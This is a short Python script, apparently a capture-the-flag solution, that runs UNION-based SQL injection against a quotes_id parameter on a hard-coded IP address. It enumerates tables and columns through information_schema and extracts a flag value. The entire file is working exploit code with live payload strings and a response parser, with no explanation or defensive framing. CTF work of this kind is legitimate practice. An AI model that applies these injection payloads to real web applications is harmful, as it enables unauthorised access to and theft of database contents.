import requests
import re
from pwn import context, log

context.log_level = "INFO"

URL = "http://103.185.38.202:50001/"

def make_req(payload, url=URL):
    res = requests.get(url+f"/?quotes_id={payload}&submit")
    return res.text

def parse(text):
    _1 = re.findall(r'(?<=<h2 style="color: black;">).*?(?=</h2>)', text)[0]
    _2 = re.findall(r'(?<=<h3 style="color: black;">).*?(?=</h3>)', text)[0]
    return (_1, _2)

def get_table_name():
    a = make_req("-1 UNION SELECT table_schema, table_name FROM information_schema.tables ORDER BY 1")
    a = parse(a)
    log.info("table_name: %s", a[0])
    log.info("table_schema: %s", a[1])

def get_table_colums():
    a = make_req("-1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE 'f%'")
    print(a)

def get_colomn_value():
    a = make_req("-1 UNION SELECT flag, 'asasd' FROM theflag_4353634859234")
    print(a)

if __name__ == "__main__":
    # get_table_name()
    # get_table_colums()
    get_colomn_value()
    # a = make_req("-1 UNION SELECT 1,2 FROM ctf_beefest")
    # a = parse(a)
    # print(a)
